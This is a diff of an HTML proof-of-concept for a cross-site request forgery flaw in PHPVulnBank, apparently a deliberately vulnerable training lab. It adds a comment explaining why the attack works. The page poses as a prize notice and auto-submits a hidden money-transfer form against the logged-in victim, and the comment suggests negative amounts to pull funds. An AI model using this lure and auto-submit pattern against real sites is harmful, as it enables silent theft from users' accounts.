@@ -1,10 +1,68 @@
+<!--
+  CSRF proof of concept for VULN-10.
+
+  Exercise material. Serve this from ANY origin other than the lab -- open it
+  from the filesystem, or host it on a different port -- while logged in to
+  PHPVulnBank in the same browser. The transfer executes with no interaction.
+
+  Set TARGET below to your lab instance, then open this file.
+
+  ----------------------------------------------------------------------------
+  This PoC was previously broken and is worth knowing why, because it is the
+  same mistake the lesson is about.
+
+  It posted a field named `bacno`. The endpoint has always read `tacno`, so the
+  request arrived, was accepted, and transferred nothing -- silent success. It
+  also pointed at krishnarp.guru, a domain that is not the lab. See
+  docs/legacy-mapping.md §7.5.
+  ----------------------------------------------------------------------------
+
+  WHY THIS WORKS, which is the actual lesson:
+
+    1. POST /api/v2/transfers authenticates from the SESSION COOKIE, so a
+       cross-site request carries the victim's authority automatically.
+    2. Laravel's api middleware group has no VerifyCsrfToken (bootstrap/app.php).
+    3. The endpoint accepts application/x-www-form-urlencoded, which is all an
+       HTML form can send.
+
+  All three are required. A JSON-only API is NOT CSRF-able -- a form cannot set
+  a JSON content type, and a cross-origin fetch that does triggers a preflight
+  a silent attack cannot satisfy. Remove any one of the three and this file
+  stops working while the endpoint still looks unprotected.
+
+  Compare against POST /api/v2/transfers/protected, which requires a token and
+  rejects this -- and note that it fixes ONLY the CSRF. The injection, the
+  missing ownership check, negative amounts and the race all survive there.
+
+  A negative `tamount` reverses the direction and pulls funds FROM the
+  destination account (VULN-16). Try it.
+-->
+<!DOCTYPE html>
 <html>
-    <form id="transfer_form" action="http://krishnarp.guru/transfer.php" method="POST">
-        <input type="text" name="bacno" value="2" />
-        <input type="text" name="tamount" value="20" />
-        <input type="text" name="submit" value="Transfer" />
+<head>
+    <meta charset="utf-8">
+    <title>Congratulations! You have won a prize</title>
+</head>
+<body>
+    <h1>Congratulations!</h1>
+    <p>You have been selected for an exclusive offer. Claiming it now&hellip;</p>
+
+    <form id="transfer_form" method="POST" action="">
+        <!-- `tacno` is the parameter the endpoint actually reads. -->
+        <input type="hidden" name="tacno" value="2">
+        <input type="hidden" name="tamount" value="500">
     </form>
-    <script type="text/javascript">
-        document.getElementById("transfer_form").submit();
+
+    <script>
+        // Change this to your lab instance.
+        const TARGET = 'http://192.168.68.51:8090';
+
+        const form = document.getElementById('transfer_form');
+        form.action = TARGET + '/api/v2/transfers';
+
+        // Auto-submit: no click, no consent. The victim only has to load
+        // this page while holding a valid session on the lab.
+        form.submit();
     </script>
+</body>
 </html>
